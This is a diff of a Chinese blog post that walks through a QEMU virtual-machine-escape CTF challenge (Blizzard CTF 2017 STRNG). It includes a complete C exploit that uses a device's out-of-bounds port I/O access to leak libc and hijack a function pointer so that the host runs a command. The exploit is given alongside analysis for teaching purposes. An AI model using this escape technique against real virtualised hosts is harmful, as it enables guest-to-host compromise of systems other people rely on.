@@ -2,6 +2,9 @@
 title: "[VMPwn] 老头初探 QEMU 逃逸"
 authors: [nova]
 date: 2025-05-06
+last_update:
+  author: nova
+  date: 2025-05-12
 ---
 
 "我为什么不会虚拟机逃逸？" 走在路上突然想起这个事情，突然想起前人曾经说过的一句话："不会虚拟机逃逸的人是失败的"。
@@ -455,6 +458,8 @@ lspci
 
 之后我们编译然后上传。
 
+### exp
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -726,7 +731,7 @@ printf("mmio_read(4) = 0x%x\n", mmio_read(4));
 
 显然拿到了，不过一次拿一个 uint32，所以我们要再往前读一点，然后计算 libc 基址，然后拿到 system 上去，对于 /bin/sh 也是一样，不再赘述。
 
-
+### exp
 
 ```c
 #include <sys/io.h>
@@ -1041,6 +1046,230 @@ c
 docker run -it -v .:/mnt --rm --privileged nopwnv2:18.04
 ```
 
+
+
+## Stage2: Simple OOB with PMIO - Blizzard CTF 2017 / STRNG
+
+> 题目附件：[rcvalle/blizzardctf2017: Blizzard CTF 2017: Sombra True Random Number Generator (STRNG).](https://github.com/rcvalle/blizzardctf2017)
+
+上面那题在当时看了洋爹的 exp，因此不太有自我思考的成分在。我们从零做个经典的。
+
+
+
+拿到一个 tar 包，结果他没有启动参数，也没有用 docker。一看 github 是 ubuntu14.04 的环境。哈哈，你看这事闹得。但是尝试了一下它的命令还是能起起来的， 那就在我 Arch 上跑了。
+
+
+
+直接丢 ida 研究一下，有符号，直接搜题目名字看看，直接一眼顶针了。
+
+![image-20250512163919166](https://oss.nova.gal/img/image-20250512163919166.png)
+
+ 但是这个不好看，显然是因为这里是 ObjectClass 的原因，给他修一下改成 PCIDeviceClass。
+
+![image-20250512164422658](https://oss.nova.gal/img/image-20250512164422658.png)
+
+自然对应我们 `lspci -v` 里的这个设备
+
+```bash
+00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
+        Subsystem: Red Hat, Inc Device 1100
+        Physical Slot: 3
+        Flags: fast devsel
+        Memory at febf1000 (32-bit, non-prefetchable) [size=256]
+        I/O ports at c050 [size=8]
+```
+
+拿到了 PMIO 的 baseaddr 0xc050
+
+
+
+回到 ida，我们看看 pmio/mmio 的 read/write 函数，记得把第一个 opaque 修一下类型，具体类型也可以在 Local Type 里面找到，是 `STRNGState *`
+
+在 mmio_write 中发现我们可以设置 rand 种子，然后也可以利用 rand 函数生成随机数存进去，还有一个 rand_r 函数，它的参数来自于 `opaque->regs[2]`，也是可以通过这里可控的。同时，我们可以往 opaque->regs[addr >> 2] 的地方写一个 val，这个看着就是越界写哈。
+
+那么思路很有可能就是修改 rand 指针，他传入的第一个参数是 opaque，那么如果开头存了 /bin/sh 就可以；不然就是改 rand_r 指针，因为它的参数我们更好控制，因为 regs[2] 是我们合法就能写的。
+
+
+
+mmio_read 可以读 `opaque->regs[addr >> 2]`，看着就是有个越界读哈，又来美美泄露 libc 咯
+
+pmio_read 也是一样，唯一的区别在于它的 addr 是 `opaque->addr`
+
+pmio_write 长得和 mmio_write 很像，但是限制更少一些，并且也没有类型转换，可以直接用 `(_DWORD)(opaque->addr >> 2)` 当下标，然后直接写 val。在 mmio_write 里， 它会写在 `(int)(addr >> 2)` 上
+
+
+
+那为啥不直接用 mmio 呢，我寻思也妹区别啊？例如我们读一个 `srand`
+
+```c
+int srand_addr = mmio_read(65<<2);
+printf("srand_addr = %x\n", srand_addr);
+```
+
+然后发现有生殖隔离，这 ubuntu14.04 实在是太高版本了。还好它的里面自带 gcc，那就把 exp.c 传过去，然后在那 gcc 编译。
+
+
+
+结果我们发现完全断不到 mmio_read 函数上，并且 srand_addr 也是 0。当我们把它地址改到 regs 的其他地方，它又可以了。
+
+
+
+显然是有高水平的东西在作怪，观察 realize 函数我们可以发现，它在 memory_region_init 的时候，竟然设置了大小为 **256**，显然，qemu 在这里存在一个检查，让我们没有办法越界访问。
+
+![image-20250512174042840](https://oss.nova.gal/img/image-20250512174042840.png)
+
+因此我们得使用 pmio，因为正如上文分析的，pmio 用的是 `opaque->addr`，而这个东西是我们可以控制的。
+
+![image-20250512174211402](https://oss.nova.gal/img/image-20250512174211402.png)
+
+那么就是用 PMIO 来打咯。
+
+:::warning 注意
+
+在运行前，我们需要调用 `iopl(3)` 去允许用户态（即 RING3）访问 io 端口。我们也可以用 `ioperm` 去允许单个端口。
+
+see [ioperm(2) - Linux manual page](https://www.man7.org/linux/man-pages/man2/ioperm.2.html), [iopl(2) - Linux manual page](https://www.man7.org/linux/man-pages/man2/iopl.2.html), [outb(2) - Linux manual page](https://man7.org/linux/man-pages/man2/outb.2.html)
+
+:::
+
+```c
+int main()
+{
+    if(iopl(3)!=0){perror("iopl failed");exit(-1);}
+
+    pmio_write(0, 65 << 2);
+    int srand_addr = pmio_read(4);
+    printf("srand_addr = %x\n", srand_addr);
+
+    return 0;
+}
+```
+
+ ```c
+ srand_addr = a49c7ba0
+ ```
+
+轻松写意了有点，继续把高位泄露，然后传参即可。
+
+有个坑点，它这个环境用 uint64_t 不能搞到 64bit，而是 32bit，不知道为啥，反正最后用了 long long 才行。
+
+
+
+但是有个问题，我们知道 rand_r 第一个参数是 `&regs[2]`，也就意味着我们如果写 `/bin/sh` 的话必然会碰到 `regs[3]`，但是在 pmio 中并不能设置 `regs[3]`，它会直接调用 `rand_r`， 因此我们还需要把 mmio 也接上。
+
+> 实际上，我们似乎也可以直接用 `sh`，从而避免这个问题。
+
+
+
+由于它是 ssh 的，不太好搞，因此我写成了 `cat flag` 来拿宿主机的 flag
+
+
+
+### exp
+
+```c
+#include <sys/io.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <assert.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <sys/types.h>
+
+unsigned char* mmio_mem;
+uint32_t pmio_base=0xc050;
+
+void die(const char* msg)
+{
+    perror(msg);
+    exit(-1);
+}
+
+void mmio_write(uint32_t addr,uint32_t value)
+{
+    *((uint32_t *)(mmio_mem+addr)) = value;
+}
+
+uint32_t mmio_read(uint32_t addr)
+{
+    return *((uint32_t*)(mmio_mem+addr));
+}
+
+void pmio_write(uint32_t addr,uint32_t value)
+{
+    outl(value,pmio_base + addr);
+}
+
+uint32_t pmio_read(uint32_t addr)
+{
+    return (uint32_t)(inl(pmio_base + addr));
+}
+
+int main()
+{
+    if(iopl(3)!=0){perror("iopl failed");exit(-1);}
+
+    pmio_write(0, 65 << 2);
+    uint32_t low_bits = pmio_read(4);
+    pmio_write(0, 66 << 2);
+    uint32_t upper_bits = pmio_read(4);
+    long long srand_addr = ((long long)upper_bits << 32) | ((long long)low_bits & 0xFFFFFFFF);
+    printf("srand_addr = 0x%llx\n", srand_addr);
+
+    long long libc_base = srand_addr - 0x43ba0;
+    long long system_addr = libc_base + 0x403860;
+    long long binsh_addr = libc_base + 0x1b3d88;
+    printf("libc_base = 0x%llx\n", libc_base);
+    printf("system_addr = 0x%llx\n", system_addr);
+    printf("binsh_addr = 0x%llx\n", binsh_addr);
+
+    // binsh
+    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
+    if (mmio_fd == -1)
+        die("mmio_fd open failed");
+
+    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
+    if (mmio_mem == MAP_FAILED)
+        die("mmap mmio_mem failed");
+
+    printf("mmio_mem @ %p\n", mmio_mem);
+
+    // system
+    pmio_write(0, 69 << 2);
+    pmio_write(4, system_addr & 0xFFFFFFFF);
+    pmio_write(0, 70 << 2);
+    pmio_write(4, (system_addr >> 32) & 0xFFFFFFFF);
+
+    // binsh
+    int binsh[2];
+    memcpy(binsh, "cat flag", 8);
+    mmio_write(2 << 2, binsh[0]);
+    mmio_write(3 << 2, binsh[1]);
+
+    // call system
+    mmio_write(3 << 2, binsh[1]);
+
+    return 0;
+}
+
+```
+
+### attachs
+
+#### compile.sh
+
+用了 sshpass 来传
+
+```bash
+#!/bin/sh
+
+sshpass -p "passw0rd" scp -P 5555 /mnt/exp.c ubuntu@localhost:/home/ubuntu/exp.c
+sshpass -p "passw0rd" ssh -p 5555 ubuntu@localhost "cd /home/ubuntu && gcc -w -s -static -o3 exp.c -o exp"
+sshpass -p "passw0rd" scp -P 5555 ubuntu@localhost:/home/ubuntu/exp .
+```
 
 
 
